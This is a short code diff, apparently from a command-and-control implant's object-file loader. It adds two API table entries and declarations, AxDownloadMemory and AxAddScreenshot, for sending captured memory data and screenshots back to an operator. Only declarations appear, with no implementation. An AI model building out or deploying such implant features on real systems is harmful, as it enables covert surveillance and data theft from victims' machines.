@@ -1047,7 +1047,7 @@ public:
     struct {
         UPTR  Hash;
         PVOID Ptr;
-    } ApiTable[36] = {
+    } ApiTable[38] = {
         ApiTable[0]  = { Hsh::Str("BeaconDataParse"),   reinterpret_cast<PVOID>(&Coff::DataParse) },
         ApiTable[1]  = { Hsh::Str("BeaconDataInt"),     reinterpret_cast<PVOID>(&Coff::DataInt) },
         ApiTable[2]  = { Hsh::Str("BeaconDataExtract"), reinterpret_cast<PVOID>(&Coff::DataExtract) },
@@ -1088,6 +1088,8 @@ public:
 
         ApiTable[34] = { Hsh::Str("BeaconGetSpawnTo"),  reinterpret_cast<PVOID>(&Coff::GetSpawn) },
         ApiTable[35] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
+            ApiTable[36] = { Hsh::Str("AxDownloadMemory"), reinterpret_cast<PVOID>(&Coff::AxDownloadMemory) },
+        ApiTable[37] = { Hsh::Str("AxAddScreenshot"), reinterpret_cast<PVOID>(&Coff::AxAddScreenshot) },
     };
 
     auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID, PVOID Entry ) -> BOF_OBJ*;
@@ -1169,6 +1171,9 @@ public:
     static auto RmValue( _In_ PCCH key ) -> BOOL;
 
     static auto Information( _Out_ BEACON_INFO* info ) -> BOOL;
+
+    static auto AxDownloadMemory( _In_ CHAR* filename, _In_ CHAR* data, _In_ INT32 size ) -> VOID;
+    static auto AxAddScreenshot( _In_ CHAR* note, _In_ CHAR* data, _In_ INT32 size ) -> VOID;
 
     static auto PrintfW( _In_ INT32 type, PWCH fmt, ... ) -> VOID;
     static auto Printf( _In_ INT32 type, _In_ PCCH Fmt, ... ) -> VOID;
